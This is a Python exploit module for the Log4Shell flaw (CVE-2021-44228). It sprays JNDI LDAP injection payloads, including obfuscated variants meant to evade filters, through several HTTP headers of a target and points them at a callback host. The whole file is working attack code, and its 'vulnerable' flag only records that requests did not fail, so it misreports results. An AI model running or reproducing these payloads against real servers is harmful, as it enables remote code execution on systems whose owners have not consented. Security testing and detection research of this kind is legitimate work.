"""CVE-2021-44228 - Log4Shell JNDI Injection RCE."""

from __future__ import annotations

import requests

_INJECTION_HEADERS: list[str] = [
    "User-Agent",
    "X-Forwarded-For",
    "Referer",
    "X-Api-Version",
    "Accept-Language",
    "Authorization",
]

_PAYLOAD_VARIANTS: list[str] = [
    "${jndi:ldap://%s/a}",
    "${${lower:j}ndi:${lower:l}dap://%s/b}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s/c}",
    "${j${::-n}di:ldap://%s/d}",
]


def exploit(
    target: str,
    callback_host: str,
    *,
    use_obfuscation: bool = True,
) -> dict:
    """Send Log4Shell payloads to *target*."""
    variants = _PAYLOAD_VARIANTS if use_obfuscation else [_PAYLOAD_VARIANTS[0]]
    payloads_sent = 0
    triggered: list[str] = []
    errors: list[str] = []

    for header in _INJECTION_HEADERS:
        for tpl in variants:
            payload = tpl % callback_host
            try:
                requests.get(target, headers={header: payload}, timeout=10)
                payloads_sent += 1
                if header not in triggered:
                    triggered.append(header)
            except requests.RequestException as exc:
                errors.append(f"{header}: {exc}")

    return {
        "cve": "CVE-2021-44228",
        "vulnerable": payloads_sent > 0 and len(errors) == 0,
        "payloads_sent": payloads_sent,
        "triggered_headers": triggered,
        "errors": errors,
    }
